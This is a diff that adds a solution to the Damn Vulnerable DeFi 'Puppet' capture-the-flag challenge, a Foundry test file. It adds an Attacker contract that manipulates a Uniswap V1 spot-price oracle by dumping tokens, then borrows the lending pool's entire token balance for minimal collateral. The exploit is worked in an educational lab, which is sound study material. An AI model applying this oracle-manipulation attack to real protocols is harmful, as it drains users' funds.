@@ -8,6 +8,41 @@ import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
+
+contract Attacker {
+
+    DamnValuableToken token;
+    IUniswapV1Exchange uniswapV1Exchange;
+    PuppetPool lendingPool;
+    uint256 immutable PLAYER_INITIAL_TOKEN_BALANCE;
+    address recovery;
+    address player;
+
+    constructor(DamnValuableToken _token, IUniswapV1Exchange _uniswapExchange,PuppetPool _pool,  address _recovery, address _player) {
+        token = _token;
+        uniswapV1Exchange = _uniswapExchange;
+        lendingPool = _pool;
+        recovery = _recovery;
+        player = _player;
+    }
+
+
+    function attack() external payable{
+        console.log(token.balanceOf(address(this)));
+        console.log(address(this).balance);
+
+        token.approve(address(uniswapV1Exchange), type(uint256).max);
+        uniswapV1Exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp + 1);
+        lendingPool.borrow{value: address(this).balance}(token.balanceOf(address(lendingPool)), recovery);
+    }
+
+
+    receive () external payable{
+    }
+    
+}
+
+
 contract PuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address recovery = makeAddr("recovery");
@@ -92,7 +127,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
+
+
+        Attacker att = new Attacker(
+            token, uniswapV1Exchange, lendingPool, recovery, player
+        );
         
+        token.transfer(address(att), token.balanceOf(address(player)));
+
+        att.attack{value: player.balance}();
+
     }
 
     // Utility function to calculate Uniswap prices
